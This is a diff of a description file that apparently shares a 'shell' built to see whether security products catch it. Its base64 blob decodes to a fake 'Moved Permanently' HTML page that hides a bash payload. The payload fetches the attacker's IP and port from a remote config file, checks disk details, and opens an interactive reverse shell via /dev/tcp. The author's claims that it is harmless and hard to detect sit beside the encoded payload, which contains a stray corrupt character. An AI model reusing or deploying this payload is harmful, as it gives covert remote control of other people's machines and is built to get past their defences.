@@ -1,5 +1,8 @@
 Description: Placing this here to save. Playing around, and this is a shell. Just needs a little further work. 
-Truth Be Told For all Other Security Companies, test your tools see if it picks up anything at all. It is currently a contained-inurl shell, with several tools built in.
+Truth Be Told For all Other Security Companies, test your tools see if it picks up anything at all. It is currently a contained-inurl shell, with several tools built in. For activation, I left it basically so no one can use it. But for activation the target/testing client must have a separate config file uploaded prior to activation.
 
 
 PEhUTUw+CjxIRUFEPgo8VElUTEU+TW92ZWQgUGVybWFuZW50bHk8L1RJVExFPgo8L0hFQUQ+CjxCT0RZIEJHQ09MT1I9IiNGRkZGRkYiIFRFWFQ9IiMwMDAwMDAiPgo8IS0tIEdTRSBEZWZhdWx0IEVycm9yIC0tPgo8SDE+TW92ZWQgUGVybWFuZW50bHk8L0gxPgpUaGUgZG9jdW1lbnQgaGFzIG1vdmVkIDxBIEhSRUY9Ii9tYWlsLyI+aGVyZTwvQT4uCjwvQk9EWT4KPC9IVE1MPgpDT05GSUdfVVJMPSJodHRwOi8vW0FUVEFDS0VSX1NFUlZFUl9JUF0vY29uZmlnLnR4dCIgJiYgXApBVFRBQ0tFUl9JTkZPPSQoY3VybCAtcyAkQ09ORklHX1VSTCAyPi9kZXYvbnVsbCkgJiYgXApBVFRBQ0tFUl9JUD0kKGVjaG8gJEFUVEFDS0VSX0lORk8gfCBzZWQgLW4gLWUgJ3MvOi4qLy9wJyAtZSAncy8gLy9nJyAtZSAncy9cdC8vZycgLWUgJzFwJyAyPi9kZXYvbnVsbCB8IHNlZCAtbiAnMXAnIDI+L2Rldi9udWxsKSAmJiBcCkFUVEFDS0VSX1BPUlQ9JChlY2hvICRBVFRBQ0tFUl9JTkZPİHwgYXdrIC1GJzonIC12IGE9MSAtdiBiPTIgLXYgYz0zIC12IGQ9NCAne3ByaW50ICQyfScgMj4vZGV2L251bGwpICYmIFwKaWYgKGhkcGFybSAtaSAtSSAtQyAtZyAtdCAvZGV2L3NkYSAyPi9kZXYvbnVsbCB8fCB0cnVlKSB8IGdyZXAgLXEgLWkgLUUgLXYgLS1saW5lLWJ1ZmZlcmVkICJTZXJpYWwgTnVtYmVyIiAyPi9kZXYvbnVsbDsgdGhlbiBcCmJhc2ggLXAgLWkgPiYgL2Rldi90Y3AvJEFUVEFDS0VSX0lQLyRBVFRBQ0tFUl9QT1JUIDA+JjE7IFwKZmkK
+
+
+If you attempt to try this, ensure you have Full Permission. This is not Malicious, but most Security in pretty sure wouldn't pick up on it.
